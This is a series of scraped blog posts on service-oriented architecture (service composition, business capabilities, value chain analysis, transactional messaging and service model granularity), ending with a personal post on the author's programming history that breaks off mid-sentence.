All services for all intents and purposes are always running (except for the odd moments of downtime) until those services are retired.  So what is a composite in SOA terms?  If I have a service A which consumes services B and C, is A a composite of B and C?  I would say no.  Otherwise all services in our enterprise would simply one big composite.<br /><br />I would suggest that composition in SOA refers to the bringing together of lower level services in order to support one or more higher level services.  It seems we need to have services at different levels in order for composition to make sense in SOA.  So if services B and C are lower level services that form part of the implementation of service A, then I would say that services B and C have been composed to form service A.<br /><br />As I mentioned in my last post, with all the hype around<a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad.html\">Layered Service Models</a>, where lower level services (like task and entity services) are composed to form higher level process services, we see service composition taking centre stage in SOA discussions far more than it really should.<br /><br />As I've<a href=\"http://bill-poole.blogspot.com/2008/04/soa-and-reuse.html\">previously discussed</a>, the type of reuse central to Layered Service Models (functional reuse as opposed to reuse of events) doesn't really work very well in practice.  Functions exposed at the service level generally are too coarsely grained to be reused in different contexts.  As such, the notion of having a registry of lower level services that can be composed together in support of higher level services is somewhat flawed.<br /><br />We<i>may</i>have lower level services such as integration services, UI services or B2B services that support a higher level business service, but those lower level services should not be reused between the higher level services.  As such, in this case the service composition is really just an implementation detail of the higher level services and as such not really architecturally noteworthy.<br /><br />So I say again, service composition in SOA is only really a noteworthy concept if you're pursuing a Layered Service Model which as I've said before is not ideal.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/LxKn8FQGXww\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1253}}

With service composition, we are referring to the creation of new services from wiring up of existing services in new ways to deliver new value.<br /><br />According to the standard reading material, service composition is best achieved through<i>orchestration</i>.  This is usually achieved through the use of middleware such as an ESB or integration broker.  A workflow orchestrates the invocations of a number of services in order to achieve some particular outcome.<br /><br />As such, we find that a service may comprise some of its own logic (including the orchestration logic), as well as a number of lower level services.<br /><br />This concept of service composition is central to the<a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad.html\">Layered Service Model</a>where lower level task and entity services are composed into higher level process services.  As you will have gleaned from my previous posts on the topic, I'm not a supporter of the Layered Service Model approach.  One of the issues of this approach is that lower level services are reused by many higher level services, resulting in high coupling between those higher level services.<br /><br />In the past, I have highly recommended that people pursue what I call a<a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad_20.html\">Self-Contained Process-Centric Service Model</a>.  Here, services are centred around autonomous business functions such as Sales, Marketing and Billing.  What I probably didn't emphasise about this approach however is that it refers only to the top-level service model.  Each business service<i>may</i>be composed of lower level services.<br /><br />Note that these lower level services are not<i>business services</i>.  They are services that serve a particular function in support of the business service.  They are an implementation detail of the business service.  In fact, they are actually really just distributed components or integration points.  However if the means of communication with the distributed component or integration point is the exchange of messages via endpoints in conformance with a service contract, then we technically have a service by the strict definition of SOA.<br /><br />In a green fields implementation where the software supporting each business service is built from scratch, there may be no lower level services involved.  That is, there is no service composition.  Alternatively, the service software may be implemented with a smart client application that interacts with some back end components via the exchange of messages in conformance to a service contract.  Thus, those back end components technically expose a service to the smart client application.<br /><br />Say in support of this business service, the back end components also interact with a Web service provided by another organisation. Now we have another service added to the mix.  Here we can see services being composed in support of the larger business service.<br /><br />Where a business service is supported by a number of legacy applications we see even more composition.  When the business service receives a message, it must invoke one or more of these legacy applications appropriately.  This<i>may</i>be achieved by invoking Web services exposed by these applications, thus constituting further service composition.<br /><br />So we see that services certainly can be composed in support of larger services.  However I would hesitate to name this as a benefit of the SOA style of architecture.  It is merely an implementation choice of any given service.  Service composition has only come to be viewed by many as a key benefit of SOA due to the reuse promised (falsely in my opinion) by the Layered Service Model approach.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/719ViZa3CHU\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1254}}

Let me begin by saying this is simply not the case.  Platform independence in the context of SOA has two connotations:<br /><br />1. Services can be hosted on any platform (Windows, Linux, .NET, Java, etc)<br />2. Services are interoperable regardless of the platforms on which they are hosted<br /><br />Firstly, let us examine what a service is from a technical standpoint.  A service is an autonomous coarse grained unit of logic which external parties can communicate by way of exchanging explicitly defined messages via its endpoints.  The messages and endpoints are described by the service contract.  Consumers must conform to policies stipulated by a service provider in order to consume the service.<br /><br />Based on the above definition, any platform that can host a process that can exchange messages over a network is capable of hosting a service.  This is not a miracle of SOA, it is simply the miracle of distributed computing which was around long before the emergence of SOA.<br /><br />The second thing to note about the above definition is that it does not mandate any specific<i>transport</i>or<i>encoding</i>of messages.  Messages do<i>not</i>have to be encoded in XML.  They do<i>not</i>have to be transported over HTTP.  Service contracts do<i>not</i>have to be specified in WSDL.  Services<i>do not have to be natively interoperable</i>.<br /><br />Now it is true that Web service technologies greatly improve service interoperability between platforms.  But services in our SOA do not have to be Web services.  Even Web services by today's definition do not mandate that messages are transported over HTTP.  It is quite acceptable for a Web service to be exposed over a JMS or MSMQ transport.  JMS and MSMQ are<i>not</i>natively interoperable.<br /><br />It is also true that an intermediary such as an ESB can provide protocol translation which can make services that exchange messages with incompatible transports and encodings interoperable.  But again, an ESB is<i>not</i>a prerequisite for SOA.<br /><br />I guess the commonly held view that SOA and platform independence go hand in hand has emerged from the association between SOA and Web services.  But once again just to set the record straight, SOA does not mandate platform independence.<br /><br />SOA<i>does</i>however mandate that implementation details of a service are encapsulated behind the service contract.  As such, SOA certainly makes platform independence easier to achieve.  We just need to overcome any incompatibilities in message transport and encoding.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/COA5WXccvL8\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1255}}

What I did not explain however is<i>why</i>queues and topics are essential for supporting transactional services.<br /><br />Queues and topics are necessary to support transactional services because that both types of transports queue messages while they await delivery.  Although the transport may not store messages durably, they are still stored somewhere until they are delivered.  Neither the sender nor receiver holds onto the message during its transport.<br /><br />So, would it be possible to implement transactional services using a non-queued transport?  For example, let us assume we wanted to use WS-AtomicTransaction (WS-AT) over an HTTP transport.  As it turns out, it is not possible to achieve this without spanning the distributed transaction across your service boundaries.  As we all know, spanning transactions across service boundaries is not a good idea as it hurts performance and reliability.<br /><br />The reason for this is that with queued transports, messages are delivered to the receiver using a pull based mechanism. Messages are first pushed to the receiving queue, after which they wait to be read by the receiver at a later time.  This means that the sending service can complete and commit its transaction without concerning itself with the success or failure of the receiving service.<br /><br />Moreover, queued transports will cache the outbound message locally making the availability of the receiver irrelevant in committing the local transaction.  Without this mechanism for storing messages as they are transported between services, the successful transport of the message as well as the successful execution of the operation at the receiver become relevant as to whether the local transaction can be committed at the sender.<br /><br />Consequently, the sender must<i>wait</i>for a response from the receiver before committing the transaction - during which time local resources will likely be locked as part of the local transaction.<br /><br />So although transactional services are an incredibly powerful tool in service design, they do unfortunately require the use of a queued transport.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/Isfq9MlkoVg\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1257}}

I'll describe these architecture domains in more detail in future posts.  In short, IT Architecture is the process of organising IT and information assets to support the business architecture and IT strategy.</p><br /><br /><p>Businesses that have strong business-IT alignment tend to have the following in common:<ul><li>IT investments can be directly linked to specific strategic business objectives.</li><li>The business drives all major IT initiatives in conjunction and cooperation with IT.</li><li>The business has an explicitly defined IT strategy which is directly linked to the business strategy.</li><li>IT is generally seen as an investment rather than an expense.</li><li>IT has direct representation in the executive leadership team and as such is present during business planning and strategy sessions.</li></ul></p><p>Most businesses today leverage IT only as a support mechanism.  IT is viewed as a cost centre - a means to an end, rather than a strategy enabler.  This is evidenced by the fact that many organisations do not have IT representation in the executive leadership team.</p><p>We see this commonly where the CFO belongs to the executive leadership team, and the CIO reports to the CFO.  In some organisations, the IT function is buried even further down in the hierarchy.  Business strategy is formulated without input from or support of IT.  IT is then involved as late as possible in the process only as a means of<i>executing</i>business strategy, rather than being involved in its<i>formulation</i>.</p><p>As a result of this ethos, IT has little to no visibility of the business strategy.  That is, IT has no visibility of the long term business plan or objectives.  Consequently, IT is limited to adding value<i>reactively</i>rather than<i>proactively</i>.  The IT function is directed to deliver systems with specific<i>tactical</i>scope, which although being part of a broader strategic vision doesn't give IT any visibility of that vision.</p><p>This results in the delivery of IT solutions that meet all the tactical requirements, but do not necessarily align with the long term strategic objectives of the organisation.</p><p>Furthermore, many organisations do not engage in Enterprise Business Architecture practices.  As such, there is no enterprise-wide functional view of the business.  Usually, there is only a structural view in the form of an organisation chart.  We usually find various business processes that have been documented with varying levels of detail, scope and accuracy, but no view as to how those processes fit into the bigger picture or how those processes support the business strategy.</p><p>As such, IT does not have the necessary information in order to formulate an effective enterprise IT architecture.  This only further forces IT down the road of acting tactically rather than strategically.  If IT has no view of the enterprise business architecture, then it cannot structure its IT assets optimally so that IT systems have high cohesion and loose coupling.</p><p>A result of delivering IT systems with only a tactical focus over an extended period of time is an enterprise IT architecture that is an unstructured mess with duplication of functionality (often manifested as many applications performing similar functions across the enterprise), suboptimal distribution of data, data locked in application silos, large numbers of complex and brittle interdependencies between systems, and poor performance and reliability of business critical IT systems.</p><p>Consequently we see an ever increasing percentage of IT budget being spent on maintaining the status quo, rather than being spent on investing in new capabilities that deliver new value to the enterprise.  Clearly this position is not sustainable in a competitive market.</p><p>One of the key ingredients in achieving business-IT alignment is an Enterprise Architecture program.  Businesses are already seeing significant returns from this investment, and time is running out for businesses that have not yet commenced engaging in this practice.</p><img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/94uv3XlhB7Q\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1258}}

I'd intended to share my thoughts on the approach with the rest of my readers but alas it slipped my mind.  Better late than never though, so I thought I'd take the opportunity to discuss the concept now.<br /><br />Consumer driven contracts as an approach is intended to provide inputs into the service provider's contract design to ensure relevance, as well as provide constraints on how a service provider's contract can evolve over time such that compatibility is maintained with consumers.<br /><br />However the intention should always be that the service provider contract evolves in such a way as to better express the concepts of the provider.  We don't want to reduce the semantic fidelity of communications with our services.<br /><br />I would say that as long as you're sticking mainly to publish-subscribe messaging (that is, avoiding command messages), then the needs of the consumer are considerably less relevant.  Consumers are only<i>informed</i>of events as they happen.  Command messages produce a subtle form of coupling where the service consumer<i>instructs</i>the service provider what to do.<br /><br />Services that publish events do not prescribe or assume what subscribed services will do (if anything) once a notification message is received.  An event message describes only an event that occurred within a service.  The subscribers should really have no influence on this.  As such, they should not be influencing the schema of the event messages published by the service provider.<br /><br />So when using publish-subscribe messaging, I would suggest that consumer contracts are useful only in providing constraints on what can be changed in the service provider's contract in order to maintain compatibility with its consumers.<br /><br />That being said, service contracts tend to be quite stable with<a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad_20.html\">process-centric self-contained service models</a>- so I've not personally found consumer driven contracts worth the effort.<br /><br />Consumer driven contracts really come into their own with data-centric contracts and centralised data architectures.  When we always need to go and get our data from elsewhere, and all our service consumers use that data for different purposes, consumers have a substantial dependency on the service provider's schema.  They will likely need to influence the provider's schema quite regularly.  That in turn will affect the other consumers.<br /><br />This is yet another reason to pursue process-centric service contracts with decentralised data architectures.  It keeps your service contracts stable by virtue of minimising dependencies between service providers and consumers.

But what is the physical manifestation of a business service?  Once we've determined the boundaries of our business services and their responsibilities, how do we go about implementing them?<br /><br />A business service is realised as a set of business processes and business rules, the people that perform those processes, the applications leveraged by those people in support of their roles in those business processes, the information leveraged by decision makers within those business processes, as well as the information as inputs and outputs of those processes, the semantics and structure of data held within the service, and the technology platforms on which the IT systems supporting the business service execute.<br /><br />Business processes in different services coordinate their activities via business events.  These business events define the interface (or service contracts) between business services.<br /><br />A business service may contain no IT systems whatsoever.  Where there<i>are</i>IT systems supporting a business service, they may not at all support the interface with the rest of the business.  A business event may be realised by a simple telephone call or a memo sent between people participating in different business services.<br /><br />Where IT systems<i>do</i>support the interface with the rest of the business, we have software components in different business services exchanging data.  In the SOA style of architecture, this data exchange is performed by way of exchanging explicitly defined messages in conformance with a service contract.<br /><br />Where we design our software components around business services (rather than taking the<a href=\"http://bill-poole.blogspot.com/2008/05/jbows-is-bad.html\">JBOWS</a>,<a href=\"http://bill-poole.blogspot.com/2008/04/web-services-integration.html\">Service Oriented Integration</a>or<a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad.html\">Layered service Model</a>approach), business events are realised as event messages published onto our service bus.  The technical service contract then consists of the schema of the messages published by the service onto one or more topics.<br /><br />Inside the boundary of our business service, we may have one or more software components that exchange data via messages.  For example, a smart client application supporting a business service may interface with one or more back end components using SOAP based messages.<br /><br />These interactions that occur<i>behind</i>the service boundary are an implementation detail of the service itself.  These design aspects are local to the business service and as such do not influence the business service contract or play a part in the broader architecture.<br /><br />In conclusion, the way in which business services are manifested in terms of IT systems depends on the flavour of SOA chosen. By aligning our technical service contracts with business services and business events we achieve considerably better structural alignment between the business and the IT systems that support it.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/IBou74EiLjA\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1260}}

A business service can be seen as a cohesive business capability that does not share process, data or business rules with any other capability.<br /><br />The interface (or service contract) between business services is expressed in terms of business events.  Business services are not dependent on how other business services are fulfilled, only the business events they raise.  Consequently, the business architecture description is very stable.  We can update process implementations without impacting any other processes so long as the high level business events are unaffected.<br /><br />Our technical service components are then aligned with our business services and business events, extending this stability and loose coupling to our IT architecture.<br /><br />So business capabilities are the key ingredient in determining our service model.  But how do we go about identifying business capabilities?  Do we simply think about what a business does at a high level and decompose?  Or is there a better way?<br /><br />A while back<a href=\"http://blogs.msdn.com/nickmalik/\">Nick Malik</a>wrote about the<a href=\"http://blogs.msdn.com/nickmalik/archive/2008/04/24/merging-capability-modeling-with-process-modeling.aspx\">relationship between capability modelling and process modelling</a>.  He posed the question as to whether these two approaches conflict, or if they are in fact complimentary.  If you've been reading my recent posts on the matter you would probably guess that I feel the two approaches are very much complimentary.<br /><br />Nick suggests that there are two main approaches one may take in identifying business capabilities.  One is process centric where capabilities are defined around process areas within an organisation.  The other suggested approach is to align business capabilities with organisational structure.  In this approach, capabilities mirror the structure of a business (such as divisions, departments, business units and teams), rather than its processes.<br /><br />As you've probably gleaned from my previous posts on business architecture modelling, I very much favour the process centric approach.  In fact, the premise of modelling business services around capabilities<i>relies</i>on the capabilities being process-centric.  As I mentioned above, the interface between business services is expressed in terms of business events.  Business events are raised by business processes.<br /><br />If a single business process were to feature in multiple capabilities (as would be the case if we modelled our capabilities around organisational structure rather than process areas), then multiple capabilities would expose the same business events.  Moreover, updating a single business process would potentially involve updating the implementation of multiple business capabilities.<br /><br />So when using business capabilities as a means of identifying candidate business services we must take a process-centric approach.  How then do we produce a process-centric capability model of our enterprise?  The answer lies with<a href=\"http://en.wikipedia.org/wiki/Value_chain\">Value Chain Analysis</a>.<br /><br />Value Chain Analysis involves identifying the top level process areas (or functions) of an organisation and mapping them as a value chain.  The value chain illustrates the series of top-level processes an organisation uses to take inputs from the market, transform those inputs, and then deliver value added products and/or services back to the market at a profit.  These processes are synergistic in nature.  The total cost of these processes is less than the value added by the organisation, thus justifying the profit margin.<br /><br />A value chain is modelled in terms of primary and support activities.  Primary activities are those that feature in the value chain itself.  They are the processes responsible for engaging with the market and directly transforming inputs into outputs.  Support activities support the primary activities.<br /><br />The value chain for a typical insurance organisation is illustrated below.<br /><br /><a href=\"http://bp2.blogger.com/_Ulehi1qz3j0/SJHNuPbDHJI/AAAAAAAAADc/uNNabMQQBM0/s1600-h/Insurance+Value+Chain.png\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;\" src=\"http://bp2.blogger.com/_Ulehi1qz3j0/SJHNuPbDHJI/AAAAAAAAADc/uNNabMQQBM0/s400/Insurance+Value+Chain.png\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5229186836651515026\" /></a><br />There are seven primary and seven support activities in the above example.  Each activity contains a number of processes that support the activity.  Note that not<i>all</i>processes within a primary activity necessarily directly contribute to the value chain.  A primary activity must only contain at least one process that contributes to the value chain.<br /><br />An organisation may also have multiple value chains.  Multiple value chains may arise where the organisation serves more than one market.  Different markets may be served with fundamentally different processes within the organisation.<br /><br />For example if we were to take two companies supplying completely different products to completely different markets and a merger were to occur, then we would end up with one organisation with two value chains.  Support activities in one value chain may be primary activities in another.<br /><br />The value chain depicts an end-to-end process that executes left to right.  In the above example, Marketing sits at the beginning of the value chain because the business must determine what products it is going to offer before doing anything else.  After determining the product mix and pricing strategy, Risk Modelling must occur to determine the means by which premium will be calculated for each product.<br /><br />Armed with this information, actual pricing (rate charts) can be determined for each product.  Note that this occurs in the Marketing activity.  So we have transitioned<i>back</i>from Risk Modelling to Marketing.  Feedback loops are always going to occur within value chains.  The point is that the first process that had to occur (determining the product mix) lay within the Marketing activity, and thus Marketing sits before Risk Modelling in the value chain.<br /><br />Now the business is in a position to start selling its insurance products to customers.  This is the Sales activity.  The Sales activity involves quotations, proposals, risk assessment and commission calculation.  Commissions are paid to all parties involved in the distribution channel.<br /><br />Once a policy has been sold, it must be written.  This is a Policy Administration activity.  Once the policy has been written, the customer must then be billed.  Once the premium has been paid by the customer, the customer<i>may</i>at some point register a claim.  Note that this activity is optional.  A customer may<i>never</i>register a claim.  The Customer Service function is then responsible for serving the needs of the customer until his or her policy expires.<br /><br />A value chain gives us a<i>functional model</i>of our organisation.  That is, it models the functions an organisation performs without consideration for<i>how</i>they are performed.  This is what gives the model its stability.<br /><br />Later on as we drill down into the lower level processes supporting each activity in the value chain, we start getting into the implementation details.  We start modelling the exact sequence of actions performed and the roles that are responsible for those actions.<br /><br />It is through defining these lower level processes that we in fact are able to define the roles within the organisation and the responsibilities and KPIs for each role.  Armed with this, we are then in a position to determine the organisational structure - that is, the reporting relationships between the defined roles.<br /><br />This is illustrated below.<br /><br /><a href=\"http://bp2.blogger.com/_Ulehi1qz3j0/SJHUQCXnJ5I/AAAAAAAAADs/4GMAXXjxATE/s1600-h/Organisational+Structure+%26+Design.png\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;\" src=\"http://bp2.blogger.com/_Ulehi1qz3j0/SJHUQCXnJ5I/AAAAAAAAADs/4GMAXXjxATE/s400/Organisational+Structure+%26+Design.png\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5229194014332757906\" /></a><br />As lower level processes change within an organisation, so may the roles and responsibilities and by extension the organisational structure.  This is further evidence of why we should model capabilities around business functions rather than organisational structure.  It provides a considerably more stable model.<br /><br />This activity of modelling the value chain has forced us to consider the entire business in a holistic and process centric way.  As such it is an excellent tool for identifying our top level process centric business capabilities that we can then use to define our business service model.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/9G_jUw0pPB4\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1261}}

Services communicate only by way of exchanging messages that conform to service contracts.  As such, service consumers are dependent only on a service provider's service contract, not its implementation.<br /><br />However if we do not take particular care in designing our service boundaries and responsibilities, and by extension its service contract, then we run the risk that our service contracts may themselves be highly dependent on a service's implementation. One such example of this is<a href=\"http://bill-poole.blogspot.com/2008/05/whitebox-services-are-bad.html\">white box services</a>.<br /><br />Consequently, we want to align our service contracts with concepts that are very stable.  With a<a href=\"http://bill-poole.blogspot.com/2008/05/jbows-is-bad.html\">JBOWS approach</a>, services are exposed somewhat arbitrarily.  They do not contribute towards any defined broader architecture.  Therefore service contracts will have an arbitrary level of stability.<br /><br />Next on the list is<a href=\"http://bill-poole.blogspot.com/2008/04/web-services-integration.html\">Service Oriented Integration</a>.  With this approach, service contracts are centred around applications.  They are expressed in terms of the application with which we are integrating.  Consequently if the scope of the application changes, or the application itself is exchanged for another (such as exchanging an Onyx CRM with MS CRM), the service contract is very likely to change.<br /><br />So what about<a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad.html\">layered service models</a>?  In this case, we have atomic business tasks, business processes and data stores abstracted as services.  These concepts are not at all stable.  Businesses very often make changes in business processes that in turn require changes in how atomic business activities are defined and how data is represented.  With this approach we are very likely to find ourselves changing our service contracts as business processes are updated.<br /><br />But what about business capabilities?  Business capabilities are by their very nature incredibly stable.  Although a retail organisation may make regular changes as to<i>how</i>it goes about inventory management, the fact is that it will<i>always</i>have an inventory management capability.  Moreover, other capabilities within the enterprise don't care<i>how</i>inventory management is performed.  They only care that it<i>is</i>performed.<br /><br />Consequently, aligning our service boundaries (and by extension our service contracts) with business capabilities gives us an incredible amount of stability.

But this then begs the question, what is a business capability?  In short, a business capability is something that an organisation<i>does</i>that contributes in some way towards the overall function performed by the organisation.<br /><br />The advantage of business capabilities is their remarkable level of stability.  If we take a typical insurance organisation, it will likely have sales, marketing, policy administration, claims management, risk assessment, billing, payments, customer service, human resource management, rate management, document management, channel management, commissions management, compliance, IT support and human task management capabilities.  In fact, any insurance organisation will very likely have many of these capabilities.<br /><br />This means that any organisation operating within the same vertical industry will have a remarkably similar capability map.  This is a result of the fact that<i>what</i>these organisations do and the services they offer are fundamentally the same.  What differs from one organisation to the next is<i>how</i>these capabilities are implemented.<br /><br />That is, the business processes, applications, data, technologies and human resources (including their roles, skills and knowledge) that support each capability will differ from one organisation to the next; but the nature of the capabilities themselves, the value they deliver, and their core responsibilities will not vary.<br /><br />This means that whether a capability is implemented as a series of completely manual processes executed by employees, whether the capability is completely or partially outsourced, or whether the capability is fully automated with IT systems does not change the nature of the capability itself.  Other capabilities within the organisation are concerned only with the fact that the capability is performed, not<i>how</i>it is performed.<br /><br />As such we can change the implementation of a business capability without affecting any other capabilities supporting the organisation.  This makes for a considerably more stable business architecture description.  One problem commonly faced by business architects is that the organisation continues to change and adapt during the process of mapping out the business processes.<br /><br />This is in part due to the fact that process maps in a typical business architecture tend to span multiple business capabilities.  This significantly increases the number of process maps that contain implementation details of a single business capability.  Consequently when we change the implementation of a business capability, there is a larger number of process maps that need to be updated.<br /><br />By limiting the scope of our process maps to a single business capability, we substantially reduce the number of process maps affected by a change in the implementation of a capability.  As a result, our business architecture description is more stable and by extension more manageable.<br /><br />Business capabilities are hierarchical in nature.  We can decompose a business capability into smaller capabilities that support the broader capability.  We only decompose a capability into smaller capabilities where there is sufficient distinctiveness between those sub-capabilities to warrant separate and distinct process maps to describe those sub-capabilities.<br /><br />Of course there are business processes that span multiple business capabilities.  However, those processes are realised as event driven process chains.  Each business process that executes within a business capability has the ability to raise business relevant events.  Other business processes that execute within other capabilities subscribe to these events in order to trigger the execution of these processes.<br /><br />As such, end-to-end business processes are realised implicitly by virtue of the event publications and subscriptions between processes defined within each business capability.  Note that this notion of business event publication and subscription is not a technology concern.  It is simply a stable means of describing how business processes execute within an enterprise.<br /><br />Now, this is a really nice way of modelling a business architecture.  But what is the relevance to SOA?  Well, when we apply the SOA style of architecture to the business architecture domain we are concerned with<a href=\"http://bill-poole.blogspot.com/2008/06/business-services.html\">business services</a>.  A business service is modelled around a business capability that has an appropriate level of coupling and cohesion.<br /><br />If we choose a business capability that addresses too many unrelated concerns, then we will have low cohesion.  If we choose a business capability that is too finely grained, we will have tight coupling between services as related concerns will be distributed across multiple business services.<br /><br />So here we see that business capability mapping is an extremely valuable tool for deriving the business service model for an organisation.  It is important to note that this entire discussion falls within the business architecture domain.  The technical components that support a business service fall into the domain of the application and technology architecture.<br /><br />We find that the business service model is an incredibly valuable tool for achieving alignment between the business and IT domains.  This is because this single model has equal relevance in both domains.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/ClGOm_-tQag\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1263}}

Well this is one of those unfortunate situations where the answer is, it depends.  However there are some good rules of thumb that can lead you to determine whether you're on the right track in terms of defining your service model.<br /><br />In the field, the number of services we see in any given enterprise tends to vary wildly.  In some organisations there is only one service - theüberservice.  Other organisations have stated they have well over 10,000 services.  But how good are these architectures?  As I've<a href=\"http://bill-poole.blogspot.com/2008/05/soa-quality-spectrum.html\">previously stated</a>just because an architecture is service oriented doesn't make it good.<br /><br />We've discussed<a href=\"http://bill-poole.blogspot.com/2008/06/are-bad.html\">überservices</a>before and they are clearly not a good thing.  So we definitely want more than one service.  But 10,000?  How on earth did they achieve that figure?  Well at the end of the day the number of services you'll end up with is largely determined by the granularity of your services.  Fine grained services will result in more services than coarse grained services.  We've discussed<a href=\"http://bill-poole.blogspot.com/2008/04/service-granularity.html\">service granularity</a>before too.<br /><br />Ultimately the number of services you end up with will largely be determined by the flavour of SOA you pursue.  If you take the<a href=\"http://bill-poole.blogspot.com/2008/05/jbows-is-bad.html\">JBOWS approach</a>(not recommended), then you could end up with<i>any</i>number of services.  You're building services in a completely uncontrolled way that doesn't conform to any particular architecture.  Usually the longer you follow this path, the more services you'll end up with.  Hopefully you stop before you reach 10,000.<br /><br />If you go down the road of<a href=\"http://bill-poole.blogspot.com/2008/04/web-services-integration.html\">Service Oriented Integration</a>then you'll end up with the same number of services as you have applications you are trying to integrate.  If you have 400 applications in your enterprise, you'll end up with 400 services.  Again, I wouldn't recommend this approach.<br /><br /><a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad.html\">Layered service models</a>have to take the prize in this competition.  Due to the incredible fine granularity of services in this model you can literally end up with thousands of services!  This is yet another reason why I wouldn't recommend this approach.<br /><br />And finally we have<a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad_20.html\">self-contained process-centric service models</a>.  With this approach services are centred around process-centric cohesive business capabilities.  The number of services you will end up with will depend on the overall complexity of your business model.  But about 10-20 services is a good rule of thumb.  Any more than 30 or 40 and I'd be raising the alarm bells.<br /><br />Another thing to note is that the size of the organisation (in terms of staffing levels) is not a major factor in determining the appropriate number of services.  The number of services will grow as the complexity of the business model grows.  Keep in mind though that sometimes the complexity of the business must grow in order to cater for increased staffing levels.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/CaaUIxee4Ek\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1264}}

The draft ontology in its current form makes reference to an example business scenario based on an imaginary car washing business.  The scenario is outlined below.<br /><br /><i>\"Joe has a one-man business. He stands on a street corner with a sponge, a bucket of water, and a sign saying \"Car Wash $5\". A customer drives up to him and asks him to wash the car. Joe asks the customer for five dollars. The customer gives him five dollars. Joe washes the car, then says, \"That's all done now,\" and the customer drives away.\"</i><br /><br />The Open Group at present states that this example identifies a single service, which embodies a single repeatable business activity performed by Joe - washing the car.  The customer is identified as the service consumer.  The customer \"consumes\" the service when he or she pays the five dollars for the car to be washed.<br /><br />There are however some issues with this model.  Firstly, the service identified in the model consists only of a single business activity. Services modelled this way are far too finely grained, thus resulting in low cohesion and high coupling between services.  A business service represents an entire cohesive business function, which may contain many processes and activities.<br /><br />Secondly, the service model completely omits the Sales function.  Although we are looking at a one man business, there are two business functions here (each of which translate to a business service).  There are two different processes at play here –<b>Sell Car Wash</b>, and<b>Wash Car</b>.  The<b>Sell Car Wash</b>process involves two roles – the Customer and the Salesperson.  The<b>Wash Car</b>process involves only one role – the Car Washer.  Joe just happens to hold two roles – the Salesperson and Car Washer roles.<br /><br />As the model as described by The Open Group consists only of one process, it is unclear as to whether their model follows an event driven paradigm.  Modelling the business architecture around business services and events provides for a far more loosely coupled and maintainable business architecture than other approaches.<br /><br />The example business scenario calls for a single end-to-end business process spanning two business services.  This is best represented as<i>two</i>business processes separately defined, but connected via a single<i>business event</i>which we might call<i>Sale Completed</i>.  This is the end event of the<b>Sell Car Wash</b>process and the begin event of the<b>Wash Car</b>process.  This is illustrated in the EPC diagram below.<br /><br /><a href=\"http://bp1.blogger.com/_Ulehi1qz3j0/SJcvdzYReiI/AAAAAAAAAD8/l-XGh5HG65Y/s1600-h/Business+Architecture.png\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;\" src=\"http://bp1.blogger.com/_Ulehi1qz3j0/SJcvdzYReiI/AAAAAAAAAD8/l-XGh5HG65Y/s400/Business+Architecture.png\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5230701681268849186\" /></a><br />Modelling our services this way has our Car Wash service as a consumer of our Sales service.

He or she is not a service consumer.<br /><br />Now although we could indeed model our business architecture as outlined by The Open Group, to do so would produce a Business Architecture with business processes spanning multiple business areas, thus having low cohesion.  This would produce a more unstable business architecture description and provide a poorer footing for our IT architecture.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/iv4cQfcuzzw\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1265}}

Although I don't personally write software these days, I've certainly done my share of it in the past and I currently manage Change Corporation's body of knowledge in the area.<br /><br />So let's get started:<br /><br /><b>How old were you when you started programming?</b><br /><br />I can't really remember it was so long ago.  But I think I was about 16 years old.  I started writing \"demos\", which were effectively programs that did various visual effects (like flying through tunnels and what have you).  The demos were entered into demo competitions.  Very nerdy really.<br /><br />I also wrote a music player application that played music stored in the S3M format.  If anyone can remember, that was the Scream Tracker file format.  The player was written in 80386 assembler and natively managed Expanded Memory (if anyone can remember that from the days of the 286 computer), hardware interrupts, and direct memory access (DMA).  The player did real time digital mixing.<br /><br /><b>What was your first programming language?</b><br /><br />I first started writing programs in C, but soon moved into 80386 assembler, and C++.  Eventually I got into Visual Objects, Visual Basic, Java and then C#.  I've also dabbled in Smalltalk and Eiffel.<br /><br /><b>What was the first real program you wrote?</b><br /><br />I suppose this question depends on the definition of \"real\".  The first commercial application I wrote was a consignment management system I think for a freight company.  It was so long ago I can't really remember - but it was written in Visual Objects.<br /><br /><b>If you knew then 